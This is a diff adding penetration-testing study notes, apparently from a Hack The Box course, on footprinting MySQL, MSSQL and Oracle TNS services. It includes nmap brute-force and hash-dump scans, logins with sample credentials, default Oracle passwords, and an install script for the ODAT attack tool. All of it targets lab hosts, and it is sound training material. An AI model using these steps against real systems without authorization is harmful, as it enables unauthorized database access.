@@ -3350,3 +3350,792 @@ devadmin@inlanefreight.htb
 InFreight SNMP v0.91
 HTB{xxx}
 ```
+
+# MySQL
+
+`MySQL` is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. The database system can quickly process large amounts of data with high performance. Within the database, data storage is done in a manner to take up as little space as possible. The database is controlled using the [SQL database language](https://www.w3schools.com/sql/sql_intro.asp). MySQL works according to the `client-server principle` and consists of a MySQL server and one or more MySQL clients. The MySQL server is the actual database management system. It takes care of data storage and distribution. The data is stored in tables with different columns, rows, and data types. These databases are often stored in a single file with the file extension `.sql`, for example, like `wordpress.sql`.
+
+#### MySQL Clients
+
+The MySQL clients can retrieve and edit the data using structured queries to the database engine. Inserting, deleting, modifying, and retrieving data, is done using the SQL database language. Therefore, MySQL is suitable for managing many different databases to which clients can send multiple queries simultaneously. Depending on the use of the database, access is possible via an internal network or the public Internet.
+
+One of the best examples of database usage is the CMS WordPress. WordPress stores all created posts, usernames, and passwords in their own database, which is only accessible from the localhost. However, as explained in more detail in the module [Introduction to Web Applications](https://academy.hackthebox.com/course/preview/introduction-to-web-applications), there are database structures that are distributed across multiple servers also.
+
+#### MySQL Databases
+
+MySQL is ideally suited for applications such as `dynamic websites`, where efficient syntax and high response speed are essential. It is often combined with a Linux OS, PHP, and an Apache web server and is also known in this combination as [LAMP](https://en.wikipedia.org/wiki/LAMP_\(software_bundle\)) (Linux, Apache, MySQL, PHP), or when using Nginx, as [LEMP](https://lemp.io/). In a web hosting with MySQL database, this serves as a central instance in which content required by PHP scripts is stored. Among these are:
+
+| Headers                 | Texts            | Meta tags         | Forms      |
+| ----------------------- | ---------------- | ----------------- | ---------- |
+| Customers               | Usernames        | Administrators    | Moderators |
+| Email addresses         | User information | Permissions       | Passwords  |
+| External/Internal links | Links to Files   | Specific contents | Values     |
+
+Sensitive data such as passwords can be stored in their plain-text form by MySQL; however, they are generally encrypted beforehand by the PHP scripts using secure methods such as [One-Way-Encryption](https://en.citizendium.org/wiki/One-way_encryption).
+
+#### MySQL Commands
+
+A MySQL database translates the commands internally into executable code and performs the requested actions. The web application informs the user if an error occurs during processing, which various `SQL injections` can provoke. Often, these error descriptions contain important information and confirm, among other things, that the web application interacts with the database in a different way than the developers intended.
+
+The web application sends the generated information back to the client if the data is processed correctly. This information can be the data extracts from a table or records needed for further processing with logins, search functions, etc. SQL commands can display, modify, add or delete rows in tables. In addition, SQL can also change the structure of tables, create or delete relationships and indexes, and manage users.
+
+`MariaDB`, which is often connected with MySQL, is a fork of the original MySQL code. This is because the chief developer of MySQL left the company `MySQL AB` after it was acquired by `Oracle` and developed another open-source SQL database management system based on the source code of MySQL and called it MariaDB.
+
+## Default Configuration
+
+The management of SQL databases and their configurations is a vast topic. It is so large that entire professions, such as `database administrator`, deal with almost nothing but databases. These structures become very large quickly, and their planning can become complicated. Among other things, DB management is a core competency for `software developers` but also `information security analysts`. To cover this area completely would go beyond the scope of this module. Therefore, we recommend setting up a MySQL/MariaDB instance to experiment with the various configurations to understand the available functionality and configuration options better. Let us have a look at the default configuration of MySQL.
+
+#### Default Configuration
+
+```shell
+gitblanc@htb[/htb]$ sudo apt install mysql-server -y
+gitblanc@htb[/htb]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
+
+[client]
+port		= 3306
+socket		= /var/run/mysqld/mysqld.sock
+
+[mysqld_safe]
+pid-file	= /var/run/mysqld/mysqld.pid
+socket		= /var/run/mysqld/mysqld.sock
+nice		= 0
+
+[mysqld]
+skip-host-cache
+skip-name-resolve
+user		= mysql
+pid-file	= /var/run/mysqld/mysqld.pid
+socket		= /var/run/mysqld/mysqld.sock
+port		= 3306
+basedir		= /usr
+datadir		= /var/lib/mysql
+tmpdir		= /tmp
+lc-messages-dir	= /usr/share/mysql
+explicit_defaults_for_timestamp
+
+symbolic-links=0
+
+!includedir /etc/mysql/conf.d/
+```
+
+## Dangerous Settings
+
+Many things can be misconfigured with MySQL. We can look in more detail at the [MySQL reference](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html) to determine which options can be made in the server configuration. The main options that are security-relevant are:
+
+|**Settings**|**Description**|
+|---|---|
+|`user`|Sets which user the MySQL service will run as.|
+|`password`|Sets the password for the MySQL user.|
+|`admin_address`|The IP address on which to listen for TCP/IP connections on the administrative network interface.|
+|`debug`|This variable indicates the current debugging settings|
+|`sql_warnings`|This variable controls whether single-row INSERT statements produce an information string if warnings occur.|
+|`secure_file_priv`|This variable is used to limit the effect of data import and export operations.|
+
+The settings `user`, `password`, and `admin_address` are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If we get another way to read files or even a shell, we can see the file and the username and password for the MySQL server. Suppose there are no other security measures to prevent unauthorized access. In that case, the entire database and all the existing customers' information, email addresses, passwords, and personal data can be viewed and even edited.
+
+The `debug` and `sql_warnings` settings provide verbose information output in case of errors, which are essential for the administrator but should not be seen by others. This information often contains sensitive content, which could be detected by trial and error to identify further attack possibilities. These error messages are often displayed directly on web applications. Accordingly, the SQL injections could be manipulated even to have the MySQL server execute system commands. This is discussed and shown in the module [SQL Injection Fundamentals](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals) and [SQLMap Essentials](https://academy.hackthebox.com/course/preview/sqlmap-essentials).
+
+## Footprinting the Service
+
+There are many reasons why a MySQL server could be accessed from an external network. Nevertheless, it is far from being one of the best practices, and we can always find databases that we can reach. Often, these settings were only meant to be temporary but were forgotten by the administrators. This server setup could also be used as a workaround due to a technical problem. Usually, the MySQL server runs on `TCP port 3306`, and we can scan this port with `Nmap` to get more detailed information.
+
+#### Scanning MySQL Server
+
+```shell
+gitblanc@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST
+Nmap scan report for 10.129.14.128
+Host is up (0.00021s latency).
+
+PORT     STATE SERVICE     VERSION
+3306/tcp open  nagios-nsca Nagios NSCA
+| mysql-brute: 
+|   Accounts: 
+|     root:<empty> - Valid credentials
+|_  Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0
+|_mysql-databases: ERROR: Script execution failed (use -d to debug)
+|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug)
+| mysql-empty-password: 
+|_  root account has empty password
+| mysql-enum: 
+|   Valid usernames: 
+|     root:<empty> - Valid credentials
+|     netadmin:<empty> - Valid credentials
+|     guest:<empty> - Valid credentials
+|     user:<empty> - Valid credentials
+|     web:<empty> - Valid credentials
+|     sysadmin:<empty> - Valid credentials
+|     administrator:<empty> - Valid credentials
+|     webadmin:<empty> - Valid credentials
+|     admin:<empty> - Valid credentials
+|     test:<empty> - Valid credentials
+|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.26-0ubuntu0.20.04.1
+|   Thread ID: 13
+|   Capabilities flags: 65535
+|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: YTSgMfqvx\x0F\x7F\x16\&\x1EAeK>0
+|_  Auth Plugin Name: caching_sha2_password
+|_mysql-users: ERROR: Script execution failed (use -d to debug)
+|_mysql-variables: ERROR: Script execution failed (use -d to debug)
+|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
+MAC Address: 00:00:00:00:00:00 (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds
+```
+
+As with all our scans, we must be careful with the results and manually confirm the information obtained because some of the information might turn out to be a false-positive. This scan above is an excellent example of this, as we know for a fact that the target MySQL server does not use an empty password for the user `root`, but a fixed password. We can test this with the following command:
+
+#### Interaction with the MySQL Server
+
+```shell
+gitblanc@htb[/htb]$ mysql -u root -h 10.129.14.132
+
+ERROR 1045 (28000): Access denied for user 'root'@'10.129.14.1' (using password: NO)
+```
+
+For example, if we use a password that we have guessed or found through our research, we will be able to log in to the MySQL server and execute some commands.
+
+```shell
+gitblanc@htb[/htb]$ mysql -u root -pP4SSw0rd -h 10.129.14.128
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 150165
+Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)                                                         
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                     
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                           
+      
+MySQL [(none)]> show databases;                                                                          
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+4 rows in set (0.006 sec)
+
+
+MySQL [(none)]> select version();
++-------------------------+
+| version()               |
++-------------------------+
+| 8.0.27-0ubuntu0.20.04.1 |
++-------------------------+
+1 row in set (0.001 sec)
+
+
+MySQL [(none)]> use mysql;
+MySQL [mysql]> show tables;
++------------------------------------------------------+
+| Tables_in_mysql                                      |
++------------------------------------------------------+
+| columns_priv                                         |
+| component                                            |
+| db                                                   |
+| default_roles                                        |
+| engine_cost                                          |
+| func                                                 |
+| general_log                                          |
+| global_grants                                        |
+| gtid_executed                                        |
+| help_category                                        |
+| help_keyword                                         |
+| help_relation                                        |
+| help_topic                                           |
+| innodb_index_stats                                   |
+| innodb_table_stats                                   |
+| password_history                                     |
+...SNIP...
+| user                                                 |
++------------------------------------------------------+
+37 rows in set (0.002 sec)
+```
+
+If we look at the existing databases, we will see several already exist. The most important databases for the MySQL server are the `system schema` (`sys`) and `information schema` (`information_schema`). The system schema contains tables, information, and metadata necessary for management. More about this database can be found in the [reference manual](https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes) of MySQL.
+
+```shell
+mysql> use sys;
+mysql> show tables;  
+
++-----------------------------------------------+
+| Tables_in_sys                                 |
++-----------------------------------------------+
+| host_summary                                  |
+| host_summary_by_file_io                       |
+| host_summary_by_file_io_type                  |
+| host_summary_by_stages                        |
+| host_summary_by_statement_latency             |
+| host_summary_by_statement_type                |
+| innodb_buffer_stats_by_schema                 |
+| innodb_buffer_stats_by_table                  |
+| innodb_lock_waits                             |
+| io_by_thread_by_latency                       |
+...SNIP...
+| x$waits_global_by_latency                     |
++-----------------------------------------------+
+
+
+mysql> select host, unique_users from host_summary;
+
++-------------+--------------+                   
+| host        | unique_users |                   
++-------------+--------------+                   
+| 10.129.14.1 |            1 |                   
+| localhost   |            2 |                   
++-------------+--------------+                   
+2 rows in set (0,01 sec)  
+```
+
+The `information schema` is also a database that contains metadata. However, this metadata is mainly retrieved from the `system schema` database. The reason for the existence of these two is the ANSI/ISO standard that has been established. `System schema` is a Microsoft system catalog for SQL servers and contains much more information than the `information schema`.
+
+Some of the commands we should remember and write down for working with MySQL databases are described below in the table.
+
+|**Command**|**Description**|
+|---|---|
+|`mysql -u <user> -p<password> -h <IP address>`|Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password.|
+|`show databases;`|Show all databases.|
+|`use <database>;`|Select one of the existing databases.|
+|`show tables;`|Show all available tables in the selected database.|
+|`show columns from <table>;`|Show all columns in the selected table.|
+|`select * from <table>;`|Show everything in the desired table.|
+|`select * from <table> where <column> = "<string>";`|Search for needed `string` in the desired table.|
+
+We must know how to interact with different databases. Therefore, we recommend installing and configuring a MySQL server on one of our VMs for experimentation. There is also a widely covered [security issues](https://dev.mysql.com/doc/refman/8.0/en/general-security-issues.html) section in the reference manual that covers best practices for securing MySQL servers. We should use this when setting up our MySQL server to understand better why something might not work.
+
+# MSSQL
+
+[Microsoft SQL](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) is Microsoft's SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. It is popular among database administrators and developers when building applications that run on Microsoft's .NET framework due to its strong native support for .NET. There are versions of MSSQL that will run on Linux and MacOS, but we will more likely come across MSSQL instances on targets running Windows.
+
+#### MSSQL Clients
+
+[SQL Server Management Studio](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) (`SSMS`) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from. It doesn't only exist on the server hosting the database. This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database. The image below shows SSMS in action.
+
+![](Pasted%20image%2020250530094826.png)
+
+Many other clients can be used to access a database running on MSSQL. Including but not limited to:
+
+| [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15) | [SQL Server PowerShell](https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15) | [HeidiSQL](https://www.heidisql.com/) | [SQLPro](https://www.macsqlclient.com/) | [Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) |
+| --------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- | ------------------------------------- | --------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
+
+Of the MSSQL clients listed above, pentesters may find Impacket's mssqlclient.py to be the most useful due to SecureAuthCorp's Impacket project being present on many pentesting distributions at install. To find if and where the client is located on our host, we can use the following command:
+
+```shell
+gitblanc@htb[/htb]$ locate mssqlclient
+
+/usr/bin/impacket-mssqlclient
+/usr/share/doc/python3-impacket/examples/mssqlclient.py
+```
+
+#### MSSQL Databases
+
+MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:
+
+|Default System Database|Description|
+|---|---|
+|`master`|Tracks all system information for an SQL server instance|
+|`model`|Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database|
+|`msdb`|The SQL Server Agent uses this database to schedule jobs & alerts|
+|`tempdb`|Stores temporary objects|
+|`resource`|Read-only database containing system objects included with SQL server|
+
+Table source: [System Databases Microsoft Doc](https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15)
+
+## Default Configuration
+
+When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as `NT SERVICE\MSSQLSERVER`. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.
+
+![](Pasted%20image%2020250530094900.png)
+
+Authentication being set to `Windows Authentication` means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment. Like with any OS, service, server role, or application, it can be beneficial to set it up in a VM from installation to configuration to understand all the default configurations and potential mistakes that the administrator could make.
+
+## Dangerous Settings
+
+It can be beneficial to place ourselves in the perspective of an IT administrator when we are on an engagement. This mindset can help us remember to look for various settings that may have been misconfigured or configured in a dangerous manner by an admin. A workday in IT can be rather busy, with lots of different projects happening simultaneously and the pressure to perform with speed & accuracy being a reality in many organizations, mistakes can be easily made. It only takes one tiny misconfiguration that could compromise a critical server or service on the network. This applies to just about every network service and server role that can be configured, including MSSQL.
+
+This is not an extensive list because there are countless ways MSSQL databases can be configured by admins based on the needs of their respective organizations. We may benefit from looking into the following:
+
+- MSSQL clients not using encryption to connect to the MSSQL server
+- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
+- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
+- Weak & default `sa` credentials. Admins may forget to disable this account
+
+## Footprinting the Service
+
+There are many ways we can approach footprinting the MSSQL service, the more specific we can get with our scans, the more useful information we will be able to gather. NMAP has default mssql scripts that can be used to target the default tcp port `1433` that MSSQL listens on.
+
+The scripted NMAP scan below provides us with helpful information. We can see the `hostname`, `database instance name`, `software version of MSSQL` and `named pipes are enabled`. We will benefit from adding these discoveries to our notes.
+
+#### NMAP MSSQL Script Scan
+
+```shell
+gitblanc@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 EST
+Nmap scan report for 10.129.201.248
+Host is up (0.15s latency).
+
+PORT     STATE SERVICE  VERSION
+1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: SQL-01
+|   NetBIOS_Domain_Name: SQL-01
+|   NetBIOS_Computer_Name: SQL-01
+|   DNS_Domain_Name: SQL-01
+|   DNS_Computer_Name: SQL-01
+|_  Product_Version: 10.0.17763
+
+Host script results:
+| ms-sql-dac: 
+|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)
+| ms-sql-info: 
+|   Windows server name: SQL-01
+|   10.129.201.248\MSSQLSERVER: 
+|     Instance name: MSSQLSERVER
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|     TCP port: 1433
+|     Named pipe: \\10.129.201.248\pipe\sql\query
+|_    Clustered: false
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
+```
+
+We can also use Metasploit to run an auxiliary scanner called `mssql_ping` that will scan the MSSQL service and provide helpful information in our footprinting process.
+
+#### MSSQL Ping in Metasploit
+
+```shell
+msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
+
+rhosts => 10.129.201.248
+
+
+msf6 auxiliary(scanner/mssql/mssql_ping) > run
+
+[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
+[+] 10.129.201.248:       -    ServerName      = SQL-01
+[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
+[+] 10.129.201.248:       -    IsClustered     = No
+[+] 10.129.201.248:       -    Version         = 15.0.2000.5
+[+] 10.129.201.248:       -    tcp             = 1433
+[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
+[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+#### Connecting with Mssqlclient.py
+
+If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.
+
+```shell
+gitblanc@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(SQL-01): Line 1: Changed database context to 'master'.
+[*] INFO(SQL-01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+
+SQL> select name from sys.databases
+
+name                                                                                                                               
+
+--------------------------------------------------------------------------------------
+
+master                                                                                                                             
+
+tempdb                                                                                                                             
+
+model                                                                                                                              
+
+msdb                                                                                                                               
+
+Transactions    
+```
+
+# Oracle TNS
+
+The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) software suite, TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.
+
+Over time, TNS has been updated to support newer technologies, including `IPv6` and `SSL/TLS` encryption which makes it more suitable for the following purposes:
+
+| Name resolution | Connection management | Load balancing | Security |
+| --------------- | --------------------- | -------------- | -------- |
+
+Furthermore, it enables encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer. This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data on the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.
+
+## Default Configuration
+
+The default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. However, some common settings are usually configured by default in Oracle TNS. By default, the listener listens for incoming connections on the `TCP/1521` port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including `TCP/IP`, `UDP`, `IPX/SPX`, and `AppleTalk`. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in `Oracle 8i`/`9i` but not in Oracle 10g/11g.
+
+The default configuration of the TNS listener also includes a few basic security features. For example, the listener will only accept connections from authorized hosts and perform basic authentication using a combination of hostnames, IP addresses, and usernames and passwords. Additionally, the listener will use Oracle Net Services to encrypt the communication between the client and the server. The configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.
+
+Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more. There have been made many changes for the default installation of Oracle services. For example, Oracle 9 has a default password, `CHANGE_ON_INSTALL`, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, `dbsnmp` that we should remember when we come across this one. Another example would be that many organizations still use the `finger` service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.
+
+Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. For example, a simple `tnsnames.ora` file might look like this:
+
+#### Tnsnames.ora
+
+```txt
+ORCL =
+  (DESCRIPTION =
+    (ADDRESS_LIST =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
+    )
+    (CONNECT_DATA =
+      (SERVER = DEDICATED)
+      (SERVICE_NAME = orcl)
+    )
+  )
+```
+
+Here we can see a service called `ORCL`, which is listening on port `TCP/1521` on the IP address `10.129.11.102`. Clients should use the service name `orcl` when connecting to the service. However, the tnsnames.ora file can contain many such entries for different databases and services. The entries can also include additional information, such as authentication details, connection pooling settings, and load balancing configurations.
+
+On the other hand, the `listener.ora` file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.
+
+#### Listener.ora
+
+```txt
+SID_LIST_LISTENER =
+  (SID_LIST =
+    (SID_DESC =
+      (SID_NAME = PDB1)
+      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
+      (GLOBAL_DBNAME = PDB1)
+      (SID_DIRECTORY_LIST =
+        (SID_DIRECTORY =
+          (DIRECTORY_TYPE = TNS_ADMIN)
+          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
+        )
+      )
+    )
+  )
+
+LISTENER =
+  (DESCRIPTION_LIST =
+    (DESCRIPTION =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
+      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
+    )
+  )
+
+ADR_BASE_LISTENER = C:\oracle
+```
+
+In short, the client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.
+
+Oracle databases can be protected by using so-called PL/SQL Exclusion List (`PlsqlExclusionList`). It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper` directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.
+
+|**Setting**|**Description**|
+|---|---|
+|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
+|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
+|`PROTOCOL`|The network protocol used for communication with the server|
+|`PORT`|The port number used for communication with the server|
+|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
+|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
+|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
+|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
+|`USER`|The username used to authenticate with the database server.|
+|`PASSWORD`|The password used to authenticate with the database server.|
+|`SECURITY`|The type of security for the connection.|
+|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
+|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
+|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
+|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|
+|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|
+|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|
+|`TRACE_LEVEL`|The level of tracing for the database connection.|
+|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
+|`TRACE_FILE_NAME`|The name of the trace file.|
+|`LOG_FILE`|The file where the log information is stored.|
+
+Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our `Pwnbox` instance in case it does not have these already. Here is a Bash script that does all of that:
+
+#### Oracle-Tools-setup.sh
+
+```bash
+#!/bin/bash
+
+sudo apt-get install libaio1 python3-dev alien -y
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+git submodule init
+git submodule update
+wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
+unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
+wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
+unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
+export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
+export PATH=$LD_LIBRARY_PATH:$PATH
+pip3 install cx_Oracle
+sudo apt-get install python3-scapy -y
+sudo pip3 install colorlog termcolor passlib python-libnmap
+sudo apt-get install build-essential libgmp-dev -y
+pip3 install pycryptodome
+```
+
+After that, we can try to determine if the installation was successful by running the following command:
+
+#### Testing ODAT
+
+```shell
+gitblanc@htb[/htb]$ ./odat.py -h
+
+usage: odat.py [-h] [--version]
+               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
+               ...
+
+            _  __   _  ___ 
+           / \|  \ / \|_ _|
+          ( o ) o ) o || | 
+           \_/|__/|_n_||_| 
+-------------------------------------------
+  _        __           _           ___ 
+ / \      |  \         / \         |_ _|
+( o )       o )         o |         | | 
+ \_/racle |__/atabase |_n_|ttacking |_|ool 
+-------------------------------------------
+
+By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
+...SNIP...
+```
+
+Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.
+
+Let's now use `nmap` to scan the default Oracle TNS listener port.
+
+#### Nmap
+
+```shell
+gitblanc@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
+Nmap scan report for 10.129.204.235
+Host is up (0.0041s latency).
+
+PORT     STATE SERVICE    VERSION
+1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
+```
+
+We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (`SID`) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database's data. When a client connects to an Oracle database, it specifies the database's `SID` along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the `tnsnames.ora` file is used.
+
